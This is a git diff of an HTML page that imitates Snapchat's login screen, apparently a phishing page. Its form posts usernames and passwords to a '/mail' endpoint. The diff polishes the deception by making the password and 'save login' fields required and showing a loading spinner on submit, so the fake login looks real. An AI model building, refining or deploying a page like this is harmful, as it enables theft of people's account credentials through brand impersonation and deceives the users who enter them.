@@ -7,30 +7,69 @@
     <title>Snapchat Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
+    <style>
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        #button-div{
+            background-color: #21b1ff;
+            transition: 400ms;
+        }
+        #spinner {
+            animation: spin;
+            animation-duration: 1s;
+            animation-timing-function: ease-in-out;
+            animation-iteration-count: infinite;
+
+            fill: rgb(216, 216, 216);
+        }
+    </style>
 </head>
 
 <body>
     <div class="login-container">
-        <h1>Log In</h1>
+        <h1 style="font-weight: 500;">Log In</h1>
         <form method="post" action="/mail">
 
             <label for="username">USERNAME OR EMAIL</label>
             <input type="text" id="username" name="username" placeholder="Enter username">
 
-            <a href="#" class="use-phone">Use phone number instead</a>
+            <a style="display: block; margin-bottom: 20px;" href="#" class="use-phone">Use phone number instead</a>
 
             <label for="password">PASSWORD</label>
-            <input type="password" id="password" name="password" placeholder="Enter password">
+            <input type="password" id="password" name="password" placeholder="Enter password" required>
 
             <div class="save-login">
-                <input type="checkbox" id="saveLogin">
+                <input type="checkbox" id="saveLogin" required>
                 <label for="saveLogin">Save Login Info on your device</label>
             </div>
 
             <a href="#" class="forgot-password">Forgot your password?</a>
-            <button>Log In</button>
+            <button id="button-div" style="display: flex; align-items: center; justify-content: center;">
+                Log In
+            </button>
         </form>
     </div>
+    <script>
+        let button_div = document.querySelector('#button-div');
+        button_div.addEventListener('click', () => {
+            button_div.innerHTML = `
+<svg id="spinner"  xmlns="http://www.w3.org/2000/svg" width="24"
+                    height="24" viewBox="0 0 24 24">
+                    <path
+                        d="M12 22c5.421 0 10-4.579 10-10h-2c0 4.337-3.663 8-8 8s-8-3.663-8-8c0-4.336 3.663-8 8-8V2C6.579 2 2 6.58 2 12c0 5.421 4.579 10 10 10z">
+                    </path>
+                </svg>
+                
+    `
+        });
+    </script>
 </body>
 
 </html>
